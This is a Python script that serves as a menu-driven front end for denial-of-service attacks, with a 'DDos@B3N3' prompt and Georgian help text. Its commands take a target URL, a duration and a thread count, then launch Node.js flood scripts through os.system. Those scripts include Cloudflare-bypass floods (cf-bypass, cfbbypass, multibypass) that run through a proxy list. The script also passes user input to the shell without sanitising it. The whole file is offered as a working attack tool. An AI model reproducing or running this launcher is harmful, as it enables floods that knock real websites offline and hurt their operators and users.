
import socket
import os
import requests
import random
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('http.txt').readlines()
bots = len(proxys)


def si():
    print("")


def layer7():
    clear()
    si()
    print(f'''
     \033[32m
              ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
              ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
              ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
              ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝
              ███████╗██║  ██║   ██║   ███████╗██║  ██║  ██╔╝
              ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ╚═╝   
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mmultibypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcfbbypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mbene                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpsflood          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpsstrong         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
    \033[32m
                   ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗██╗
                   ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗   ██╔╝██║
                   ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝  ██╔╝ ██║
                   ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗  ███████║
                   ███████╗██║  ██║   ██║   ███████╗██║  ██║  ╚════██║
                   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def menu():
    clear()      
    print("""
 \033[32m
                  
                          ██████╗  ██████╗  ███╗  ██╗ ██████╗ 
                          ██╔══██╗ ╚════██╗ ████╗ ██║ ╚════██╗
                          ██████╦╝  █████╔╝ ██╔██╗██║  █████╔╝
                          ██╔══██╗  ╚═══██╗ ██║╚████║  ╚═══██╗
                          ██████╦╝ ██████╔╝ ██║ ╚███║ ██████╔╝
                          ╚═════╝  ╚═════╝  ╚═╝  ╚══╝ ╚═════╝                       
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239mაკრიფეთ [help]  ბრძანებების სანახავად.   \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[DDos\x1b[38;2;0;186;45m@B\x1b[38;2;0;150;88m3\x1b[38;2;0;113;133mN\x1b[38;2;0;83;168m3\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        
        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example-cloud.com 20 15')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: http-raw http://example.com 20 POST')
                   

        elif "httpsflood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpsflood.js {url} {time}')
            except IndexError:
                print("Usage: httpsflood <url> <time>")
                print("Example: httpsflood https://example.com 10")

        elif "cfbbypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f"node cfbbypass.js {url} {time}")
            except IndexError:
                print("Usage: cfbbypass <url> <time>")
                print("Example: cfbbypass https://example.com 500")
                
        elif "multibypass" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                os.system(f"node multibypass.js get {url} http.txt 500 500 {threads}")    
                os.system(f"node multibypass.js get {url} http.txt 500 500 200")
            except IndexError:
                print("Usage: multibypass <url> <threads>")
                print("Example: multibypass https://example.com 200")            
                  
              
                
        elif "bene" in cnc:
            try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 os.system(f"node bene.js {url} {time}")
            except IndexError:    
                print(f'Usage: bene <host> <time>')
                print(f'Example: bene https://example.com 500')                  

            
        elif "httpsstrong" in cnc:
            try:
                url = cnc.split()[1]
                reqs = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f"node HTTPS-STRONG.js {url} {reqs} {time}")          
            except IndexError:    
                print(f'Usage: httpsstrong <host> <reqs> <time>')
                print(f'Example: httpsstrong https://example.com 500 500')
           

        elif "help" in cnc:
            clear()
            print(f''' \033[32m
                  ██╗  ██╗ ███████╗ ██╗      ██████╗
                  ██║  ██║ ██╔════╝ ██║      ██╔══██╗
                  ███████║ █████╗   ██║      ██████╔╝
                  ██╔══██║ ██╔══╝   ██║      ██╔═══╝
                  ██║  ██║ ███████╗ ███████╗ ██║
                  ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚═╝
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mHELP       \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════
               \x1b[38;2;0;212;14m║layer7   > Layer 7 შეტევის მეთოდი           ║  
               \x1b[38;2;0;212;14m║layer4   > Layer 4 შეტევის მეთოდი           ║ 
               \x1b[38;2;0;212;14m║cls      > ტერმინალის გასუფთავება           ║                                        
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════
''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
        main()

login()

